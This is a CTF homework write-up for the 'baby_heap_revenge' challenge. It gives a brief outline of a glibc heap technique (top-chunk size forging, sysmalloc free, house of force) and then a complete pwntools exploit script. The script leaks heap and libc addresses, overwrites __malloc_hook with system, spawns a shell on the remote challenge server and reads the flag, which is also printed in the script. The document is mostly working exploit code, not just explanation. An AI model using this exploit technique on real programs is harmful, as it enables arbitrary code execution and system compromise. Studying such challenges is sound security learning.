# HW5
## baby_heap_revenge 150
* 8 bytes overflow.
* `_int_free` in `sysmalloc` trick.
* Forge `top chunk` size.
* `malloc` a size larger than size of top chunk.
* Trigger `_int_free` in `sysmalloc`, got freed chunk.
* Create two smallbin chunk , and use house of force to leak `fd` and `bk` for leaking `heap` , `libc`.
* House of force force to `__malloc_hook`.
* Overwrite `__malloc_hook` with `system`.
* `malloc( size = address ["sh;"] )` -> `system( "sh;" )`.
```python
#!/usr/bin/env python
from pwn import *

# FLAG{YOUARENOTBABYATALL}

e , l = ELF('./baby_heap_revenge-1679ad2998791cc85a2e1651627a1d1304d76157') , ELF('./libc.so.6-14c22be9aa11316f89909e4237314e009da38883')


y = remote( 'csie.ctf.tw' , 10141 )


def alloc( size , data , yuawn = False ):
    y.sendafter( 'ice:' , '1' )
    y.sendafter( 'Size :' , str( size ) )
    if yuawn:
        sleep( 0.7 )
        y.sendline( 'cat /home/`whoami`/flag' )
        y.interactive()
    y.sendafter( 'Data :' , data )

def sho():
    y.sendafter( 'ice:' , '2' )



alloc( 0x400 , 'sh;' )
alloc( 0x400 , 'a' )
alloc( 0xf68 - 0x250 - 0xa00 , 'a' * ( 0xf68 - 0x250 - 0xa00 ) + p64( 0x4c1 ) ) # shrink top chunk size 0x4c1

alloc( 0x508 , 'a' * 0x508 ) # trigger sysmalloc _int_free

alloc( 0x400 , 'a' )
alloc( 0x400 , 'a' )
alloc( 0x408 , 'a' * 0x408 + p64( 0x2d1 ) ) # again

alloc( 0x308 , 'a' )
alloc( 0x210 , 'a' )

alloc( 0x108 , 'a' * 0x108 + p64( 0xffffffffffffffff ) ) # fake top chunk size for house of force

alloc( -136432 , 'a' ) # force it

alloc( 0x100 , 'A' * 0x10 )

sho()

y.recvuntil( 'A' * 0x10 )
heap = u64( y.recv(4).ljust( 8 , '\x00' ) ) - 0xf50
log.success( 'heap -> %s' % hex( heap ) )

alloc( 0x108 , 'a' * 0x108 + p64( 0xffffffffffffffff ) )

alloc( -560 , 'a' )

alloc( 0x100 , 'a' * 8 + p64( 0x91 ) ) # fix smallbin size

alloc( 0x88 , 'a' )

alloc( 0x88 , 'A' * 8 )

sho()
y.recvuntil( 'A' * 0x8 )
l.address += u64( y.recv(6).ljust( 8 , '\x00' ) ) - 0x3c4bf8
log.success( 'libc -> %s' % hex( l.address ) )

alloc( 0x18 , 'a' * 0x18 + p64( 0xffffffffffffffff ) )

top_ofs = 0x22070

log.info( 'nb -> ' + str( l.symbols['__malloc_hook'] - ( heap + top_ofs ) - 0x20  ) )

alloc( l.symbols['__malloc_hook'] - ( heap + top_ofs ) - 0x20 , 'a' ) # force to __malloc_hook


alloc( 0x777 , p64( l.symbols['system'] ) )

alloc( heap + 0x10 , 'yuawn' , yuawn = True ) # malloc( size = ["sh;"] ) -> system( "sh;" )
```